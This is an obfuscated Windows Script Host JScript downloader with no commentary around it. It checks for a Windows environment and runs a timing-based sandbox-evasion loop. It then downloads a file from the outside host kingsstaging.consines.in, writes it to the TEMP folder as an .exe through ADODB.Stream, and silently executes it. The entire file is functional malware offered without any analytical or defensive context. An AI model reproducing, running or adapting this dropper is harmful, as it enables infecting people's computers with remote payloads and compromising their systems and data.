var Hm = false;
var yC = "CreateObject";
var on = function W() {return WScript[yC]("WScript.Shell");}(), f = 11;
var tS = "MSXML2.XMLHTTP";
var KW = 2123213;
var iW = 0;
function V(i){on["Run"](i, iW, iW);};
function t(){return "" + tS;};
function K0(R, s){iW = iW * 1; return R - s;};
function K(){return yC;};
/*@cc_on
  @if (@_win32 || @_win64)
    Hm = true;
  @end
@*/
if (Hm)
{
var gC = "";
function b0(){return 22;};
var Pw = 0; var O0 = 0;
function j()
{
var A = new this["Date"]();
var k = A["getUTCMilliseconds"]();
WScript["Sleep"](b0());
var A = new this["Date"]();
var eO = A["getUTCMilliseconds"]();
WScript["Sleep"](b0());
var A = new this["Date"]();
var vg = A["getUTCMilliseconds"]();
var Pw = "O";
Pw = K0(eO, k);
var O0 = "y";
O0 = K0(vg, eO);
gC = "open";
return K0(Pw, O0);
}
var a = false;
var SZ = false;
for (var bs = iW; bs < b0() * 1; bs++){if (j() != iW){
a = true; 
O0 = "31" + 11 * Pw + O0; 
SZ = true; 
break;
}}
function b() {return ((a == true) && (a == SZ)) ? 1 : iW;};
if (a && b() && SZ){
function Xl() {return on["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "XatuLQpybTa7M.exe";};
 Sq = t();
 r = WScript[yC](Sq);
 var N = 1;
 while (N){
try {
r[gC]("GET", "http://kingsstaging.consines.in/l9osaw", false);
r["send"]();
wj = "Sleep";
for (;;){WScript[wj](b0() * 11); if (r["readystate"] >= 2 * 2) break;};
N = iW;
} catch(z){};
}
function B(Tx) {var wD = (1, 2, 3, 4, 5, Tx); return wD;};
GV = WScript[K()]("ADODB.Stream");
Sq = GV;
Sq[gC]();
Sq["type"] = B(1);
Sq["write"](r["ResponseBody"]);
GV["position"] = B(iW);
Sq["Save" + "ToFile"](Xl(), 2);
GV["c"+"lose"]();
h = Xl();
V(h);
}
}

